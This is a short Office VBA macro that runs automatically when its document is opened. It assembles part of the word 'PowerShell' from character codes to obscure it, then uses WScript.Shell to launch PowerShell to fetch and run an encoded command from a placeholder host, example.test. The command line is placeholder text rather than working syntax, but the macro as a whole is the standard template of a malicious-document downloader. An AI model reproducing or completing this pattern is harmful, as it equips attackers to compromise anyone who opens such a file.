Sub AutoOpen()
    Dim runner As Object
    Dim textPart As String
    textPart = Chr(80) & Chr(111) & Chr(119) & Chr(101) & Chr(114)
    Set runner = CreateObject("WScript.Shell")
    runner.Run "powershell example encoded-command from http://example.test/file"
End Sub



